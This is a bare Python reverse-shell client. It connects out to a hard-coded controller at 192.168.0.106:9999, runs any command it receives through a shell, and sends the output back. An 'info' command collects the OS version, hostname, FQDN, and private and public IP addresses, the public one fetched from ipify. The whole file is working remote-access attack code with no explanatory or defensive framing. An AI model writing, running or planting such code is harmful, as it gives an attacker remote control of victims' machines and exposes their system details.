import socket
import os
import re
import sys
import subprocess
import platform
import psutil
from requests import get

def info():
    system_data = platform.uname()
    hostname = socket.gethostname() # returns hostname
    fqdn = socket.getfqdn('www.google.com') # returns fully qualified domain name for name
    ip_address = socket.gethostbyname(hostname)  # returns IPv4 address with respect to hostname
    os.system('ip addr > out.txt')
    f = open("out.txt", "r")
    strings = re.findall(r'192.168.\d{1,3}.\d{1,3}', f.read())
    ip = get('https://api.ipify.org').text

    output1 = 'Operating System : '+str(system_data.system)
    # output1 = str(output)
    
    output2 = 'Machine : '+ str(system_data.machine)
    output3 = 'Processor : '+ str(system_data.processor)
    output4 = 'Release : '+ str(system_data.release)
    output5 = 'Version : '+ str(system_data.version)
    output6 = 'Hostname : ' + str(hostname)
    output7 = 'IP Address : ' + str(ip_address)
    output8 = 'FQDN : ' + str(fqdn)
    output9 = 'Public IP address : '+ str(ip)
    output10 = 'Private IP Address : ' + str(strings[-2])
    output = output1 +'\n'+ output2 +'\n'+ output3 +'\n'+ output4 +'\n'+ output5 +'\n'+ output6 +'\n'+ output7 +'\n'+ output8 +'\n'+ output9 +'\n'+ output10
    return output

s = socket.socket()
host = '192.168.0.106'
port = 9999

s.connect((host, port))



while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if data.decode("utf-8") == 'info':
        print('Fuck u')
        output_byte = info()
        output_str = str(output_byte)
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str +'\n'+ currentWD))
        print(output_str)

    elif len(data) > 0:
        print(data)
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

        print(output_str)

    